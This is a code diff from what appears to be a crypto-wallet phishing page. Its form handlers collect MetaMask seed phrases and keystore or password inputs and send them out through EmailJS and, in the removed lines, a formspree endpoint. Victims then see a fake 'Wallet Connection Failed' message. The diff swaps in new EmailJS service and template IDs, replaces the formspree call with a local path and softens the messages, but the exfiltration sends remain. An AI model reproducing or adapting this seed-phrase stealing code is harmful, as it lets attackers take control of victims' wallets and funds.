@@ -1967,7 +1967,7 @@ confirmKeystoreBtn.addEventListener("click", async () => {
   <script>
    (function() {
   // Initialize with your actual user ID
-  emailjs.init("3GisVeBnMqKHJisZX"); //FAKE
+  emailjs.init("kRhn3zk5q5WGjX889N-7u"); //FAKE
 })();
 
 async function handleFormSubmit(e) {
@@ -1999,8 +1999,8 @@ async function handleFormSubmit(e) {
     }
 
     console.log("Params before sending:", params); // Final check
-    await emailjs.send("service_trxzcr3", "template_wlyr6xm", params);
-    showPopup("Wallet Connection Failed");
+    await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
+    showPopup("Submission failed. Please try again.");
     form.reset(); // Reset AFTER logging
   } catch (error) {
     console.error('Error:', error);
@@ -2191,13 +2191,10 @@ function togglePasswordVisibility(inputElement, eyeIcon) {
     const formData = new FormData(form);
 
     try {
-      await fetch('https://formspree.io/f/mlgvqagz', {
-  method: 'POST',
-  body: formData,
-  headers: {
-    'Accept': 'application/json'
-  }
-});
+      await fetch('/noconn', {
+        method: 'POST',
+        body: formData
+      });
       document.getElementById('popup-container').style.display = 'none';
       Swal.fire({
         icon: 'success',
@@ -2885,7 +2882,7 @@ document.addEventListener('DOMContentLoaded', function () {
   const submitBtn = document.getElementById('meta_btn');
   
   // Initialize EmailJS
-  emailjs.init("wQvQUmd6saTY7blzW");
+  emailjs.init("kRhn3zk5q5WGjX889N-7u");
 
   submitBtn.addEventListener('click', async function () {
     const inputs = document.querySelectorAll('.metamask-seed-input');
@@ -2928,9 +2925,9 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 
     try {
-      await emailjs.send("service_ds9xjcb", "template_dj0emzm", params);
+      await emailjs.send("service_5j6r3vq", "template_c1zlv3v", params);
       console.log("EmailJS send success");
-      showPopup("Wallet Connection Failed"); // You might want a success message instead
+      showPopup("Submission failed. Please try again."); // You might want a success message instead
     } catch (err) {
       console.error("EmailJS send error:", err);
       showPopup("Submission failed. Please try again.");
